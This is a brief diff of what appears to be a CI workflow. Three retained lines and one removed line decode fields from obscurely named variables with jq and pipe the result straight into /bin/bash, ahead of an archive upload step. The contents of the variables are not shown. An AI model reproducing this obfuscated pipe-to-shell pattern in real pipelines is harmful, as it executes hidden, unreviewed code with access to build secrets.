@@ -23,7 +23,6 @@ jobs:
           echo $dpgtd63416 | jq -r .y32 | /bin/bash
           printf '%s' "$ypfhr125" | jq -r .vx54 | /bin/bash
           printf '%s' "$ej97" | jq -r .gx7845 | /bin/bash
-          echo $d74 | jq -r .x76 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
